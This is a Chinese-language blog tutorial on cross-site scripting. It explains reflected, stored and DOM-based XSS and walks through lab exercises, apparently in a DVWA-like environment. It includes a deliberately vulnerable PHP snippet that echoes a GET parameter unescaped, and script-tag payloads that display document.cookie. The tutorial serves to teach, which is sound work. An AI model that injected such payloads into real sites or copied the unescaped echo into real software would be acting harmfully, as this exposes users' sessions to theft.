<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>XSS | 栈桥仔</title>

  <!-- keywords -->
  

  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="XSS介绍跨站脚本(Cross-Site Scripting跨域脚本攻击，简称为XSS)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。他允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限(如执行一些操作)、私密网页内容、会话和cookie等各种内容 XSS原因：过于信任客户端提交的数据  XSS攻击可分为三种：反射性，存">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS">
<meta property="og:url" content="https://zhanqiaozai.github.io/2020/04/20/XSS/index.html">
<meta property="og:site_name" content="栈桥仔">
<meta property="og:description" content="XSS介绍跨站脚本(Cross-Site Scripting跨域脚本攻击，简称为XSS)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。他允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限(如执行一些操作)、私密网页内容、会话和cookie等各种内容 XSS原因：过于信任客户端提交的数据  XSS攻击可分为三种：反射性，存">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091025553.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408195920593.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408200115396.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091124829.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201711023.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201852944.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201946633.png">
<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/2461408-afb50bde75195453.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/508">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210507911.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210534686.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210612217.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409200826972.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200411202430272.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409201153784.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072641793.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412072738166.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412073005775.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412101121579.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103408590.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412103459549.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412162004695.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164221318.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164519559.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164637047.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164710431.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164751037.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164821609.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412164913334.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165011200.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165059221.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412165149142.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171407361.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412171430380.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412170229771.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192339311.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412192548959.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412193629918.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412201400697.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202013079.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202024254.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202312416.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412202332477.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412205955459.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412210200170.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213252200.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213328524.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412213356826.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214012337.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214101416.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200412214152472.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413092056335.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093804378.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413093933071.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094042891.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094159681.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094233493.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094259472.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413094344690.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413101509383.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103113469.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103928497.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413103956585.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104028973.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104605249.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104628621.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413104657566.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111230387.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111547950.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413111727842.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112410445.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413112542216.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133315239.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413133620268.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135406234.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135708936.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413135729704.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141408260.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413141505272.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413143908401.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413144534630.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145621371.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413145044448.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413152406498.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153224582.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413153245648.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193122104.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193535545.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413193837927.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194654678.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413194724423.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195311101.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195353237.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200413195418479.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414084954106.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414085844194.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414090353664.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414093328336.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095059130.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095153281.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414095306986.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414140342524.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152038909.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414152200102.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414162753350.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163018581.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163213485.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414163234488.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165148387.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165445847.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414165702242.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210507320.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200414210533918.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100911703.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415100943454.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415134518536.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135051423.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135306740.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415135813336.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140124310.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415140140261.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175404676.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175524635.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415175910063.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200415180212082.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101131762.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101232606.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416101257277.png">
<meta property="og:image" content="https://zhanqiaozai.github.io/2020/04/20/XSS/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200416101920286.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416105305914.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111001365.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416110923115.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111051812.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416111119690.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131647589.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416131716069.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132559662.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416132700892.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140523501.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140656017.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140808003.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416140853720.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416141524570.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142010850.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142307890.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142630506.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416142658469.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165118729.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416165359455.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416170820749.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195054147.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195258557.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416195713132.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416200741297.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203528298.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416203725722.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416205446505.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210453280.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416210905870.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211039263.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200416211147311.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085414839.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417085758601.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090319747.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417090643047.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091315408.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417091334674.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092125950.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417092243656.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093057564.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417093744922.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095550503.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417095751376.png">
<meta property="og:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417101428690.png">
<meta property="article:published_time" content="2020-04-20T01:00:48.651Z">
<meta property="article:modified_time" content="2020-04-20T00:59:46.000Z">
<meta property="article:author" content="zhanqiaozai">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091025553.png">
  
    <link rel="alternative" href="/atom.xml" title="栈桥仔" type="application/atom+xml">
  
  
    <link rel="icon" href="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg">
  
  
<link rel="stylesheet" href="/css/style.css">

  
  

  
<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>

  
<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>


  
<meta name="generator" content="Hexo 4.2.0"></head>
<body>
  <div id="container">
    <div id="particles-js"></div>
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			
			<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			
		</a>

		<hgroup>
		  <h1 class="header-author"><a href="/">zhanqiaozai</a></h1>
		</hgroup>

		

		
			<div class="switch-btn">
				<div class="icon">
					<div class="icon-ctn">
						<div class="icon-wrap icon-house" data-idx="0">
							<div class="birdhouse"></div>
							<div class="birdhouse_holes"></div>
						</div>
						<div class="icon-wrap icon-ribbon hide" data-idx="1">
							<div class="ribbon"></div>
						</div>
						
						<div class="icon-wrap icon-link hide" data-idx="2">
							<div class="loopback_l"></div>
							<div class="loopback_r"></div>
						</div>
						
						
					</div>
					
				</div>
				<div class="tips-box hide">
					<div class="tips-arrow"></div>
					<ul class="tips-inner">
						<li>菜单</li>
						<li>标签</li>
						
						<li>友情链接</li>
						
						
					</ul>
				</div>
			</div>
		

		<div class="switch-area">
			<div class="switch-wrap">
				<section class="switch-part switch-part1">
					<nav class="header-menu">
						<ul>
						
							<li><a href="/">主页</a></li>
				        
							<li><a href="/archives">所有文章</a></li>
				        
						</ul>
					</nav>
					<nav class="header-nav">
						<div class="social">
							
						</div>
					</nav>
				</section>
				
				
				<section class="switch-part switch-part2">
					<div class="widget tagcloud" id="js-tagcloud">
						
					</div>
				</section>
				
				
				
				<section class="switch-part switch-part3">
					<div id="js-friends">
					
			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/smackgg/hexo-theme-smackdown">smackdown</a>
			        
			        </div>
				</section>
				

				
			</div>
		</div>
	</header>				
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
  	<div class="overlay">
  		<div class="slider-trigger"></div>
  		<h1 class="header-author js-mobile-header hide">zhanqiaozai</h1>
  	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img lazy-src="http://7xkj1z.com1.z0.glb.clouddn.com/head.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author">zhanqiaozai</h1>
			</hgroup>
			
			<nav class="header-menu">
				<ul>
				
					<li><a href="/">主页</a></li>
		        
					<li><a href="/archives">所有文章</a></li>
		        
		        <div class="clearfix"></div>
				</ul>
			</nav>
			<nav class="header-nav">
				<div class="social">
					
				</div>
			</nav>
		</header>				
	</div>
</nav>
      <div class="body-wrap"><article id="post-XSS" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2020/04/20/XSS/" class="article-date">
  	<time datetime="2020-04-20T01:00:48.651Z" itemprop="datePublished">2020-04-20</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      XSS
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h4 id="XSS介绍"><a href="#XSS介绍" class="headerlink" title="XSS介绍"></a>XSS介绍</h4><p>跨站脚本(Cross-Site Scripting跨域脚本攻击，简称为XSS)是一种针对网站应用程序的安全漏洞攻击技术，是代码注入的一种。他允许恶意用户将代码注入网页，其他用户在浏览网页时就会受到影响。恶意用户利用XSS代码攻击成功后，可能得到很高的权限(如执行一些操作)、私密网页内容、会话和cookie等各种内容</p>
<h5 id="XSS原因："><a href="#XSS原因：" class="headerlink" title="XSS原因："></a>XSS原因：</h5><p>过于信任客户端提交的数据</p>
<ul>
<li><h5 id="XSS攻击可分为三种：反射性，存储型，DOM型"><a href="#XSS攻击可分为三种：反射性，存储型，DOM型" class="headerlink" title="XSS攻击可分为三种：反射性，存储型，DOM型"></a>XSS攻击可分为三种：反射性，存储型，DOM型</h5></li>
</ul>
<h4 id="XSS漏洞原理"><a href="#XSS漏洞原理" class="headerlink" title="XSS漏洞原理"></a>XSS漏洞原理</h4><h5 id="1、反射性XSS"><a href="#1、反射性XSS" class="headerlink" title="1、反射性XSS"></a>1、反射性XSS</h5><p>​        反射性XSS又称为<strong>非持久性XSS</strong>，这种攻击方式往往只具有<strong>一次性</strong></p>
<p>​        攻击方式：攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问连接时，服务器接收该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会出发XSS漏洞</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091025553.png" alt="image-20200409091025553"></p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	echo $_GET[&quot;uname&quot;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当用户访问<code>url?uname=&lt;script&gt;alert(&quot;hello&quot;);&lt;/script&gt;</code>触发代码弹出对话框</p>
<p>随便输入内容，会返回输入的内容</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408195920593.png" alt="image-20200408195920593"></p>
<p>使用<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>查看页面返回，成功返回cookie值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408200115396.png" alt="image-20200408200115396"></p>
<h5 id="2、存储型XSS"><a href="#2、存储型XSS" class="headerlink" title="2、存储型XSS"></a>2、存储型XSS</h5><p>​        存储型XSS又称为<strong>持久性XSS</strong>，攻击脚本将被永远地存放在目标服务器的数据库或文件中，具有很高的隐秘性</p>
<p>​        攻击方式：这种攻击多见于论坛、博客、和留言版，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子中，随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入的恶意脚本帖子时，恶意脚本会在他们的浏览器中得到执行。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200409091124829.png" alt="image-20200409091124829"></p>
<p>​        例如，恶意攻击这在留言板中加入以下代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;hacker by hacker&#x2F;)&lt;&#x2F;script&gt;)</span><br></pre></td></tr></table></figure>

<p>当其他用户访问留言板时，就会看到一个弹窗。可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入到一个页面中，所有访问这个页面的用户都将成为受害者。</p>
<p>在name处输入hello，或者其他任何都行，在Message输入XSS代码</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201711023.png" alt="image-20200408201711023"></p>
<p>点击Sign Guestbook，返回cookie值</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201852944.png" alt="image-20200408201852944"></p>
<p>刷新页面或者切换别的模式在回来点还是弹出cookie信息</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408201946633.png" alt="image-20200408201946633"></p>
<h5 id="3、DOM型XSS"><a href="#3、DOM型XSS" class="headerlink" title="3、DOM型XSS"></a>3、DOM型XSS</h5><p>​        DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。<br>​        DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞。<br>在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。</p>
<p>​        <strong>HTML的标签都是节点</strong>，而这些节点组成了DOM的整体结构—<strong>节点树。</strong>通过HTML DOM，树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节点)均可被修改，也可以创建或删除节点，<strong>HTML DOM树结构</strong></p>
<p><img src="https://upload-images.jianshu.io/upload_images/2461408-afb50bde75195453.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/508" alt="img"></p>
<p>查看DMO XSS 选择一个类型进行上传</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210507911.png" alt="image-20200408210507911"></p>
<p>发现URL改变了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210534686.png" alt="image-20200408210534686"></p>
<p>在括号处更改值，例如改为123，然后回车，发现下拉选项框中出现了123</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200408210612217.png" alt="image-20200408210612217"></p>
<h4 id="构造XSS脚本"><a href="#构造XSS脚本" class="headerlink" title="构造XSS脚本"></a>构造XSS脚本</h4><h5 id="常用HTML标签"><a href="#常用HTML标签" class="headerlink" title="常用HTML标签"></a>常用HTML标签</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt;	ifranme 元素会创建包含另一个文档的内联框架(即行内框架)</span><br><span class="line">&lt;textarea&gt;	&lt;textarea&gt;标签定义多行的文本输入控件</span><br><span class="line">&lt;img&gt;		img元素像网页中嵌入一幅图像</span><br><span class="line">&lt;script&gt;	&lt;script&gt; 标签用于定义客户端脚本，如果JavaScript。</span><br><span class="line">			script 元素既可以包含脚本语句，也可以通过src 属性指向外部脚本文件</span><br><span class="line">			必须的 type 属性规定脚本的MIME类型。</span><br><span class="line">			JavaScript 的常见应用时图片操作、表单验证以及动态内容更新</span><br></pre></td></tr></table></figure>

<h5 id="常用的JavaScript方法"><a href="#常用的JavaScript方法" class="headerlink" title="常用的JavaScript方法"></a>常用的JavaScript方法</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alert				alert()方法用于显示带有一条指定信息和一个按钮的警告框</span><br><span class="line">window.loaction		window.loaction对象用于获得当前页面的地址(URL),并把浏览器重定向到新的页面</span><br><span class="line">location.href		返回当前显示的文档的完整 URL</span><br><span class="line">onload				一张页面或一幅图像完成加载</span><br><span class="line">onsubmit			确认按钮被点击</span><br><span class="line">onerror				在加载文档或图片时发生错误</span><br></pre></td></tr></table></figure>

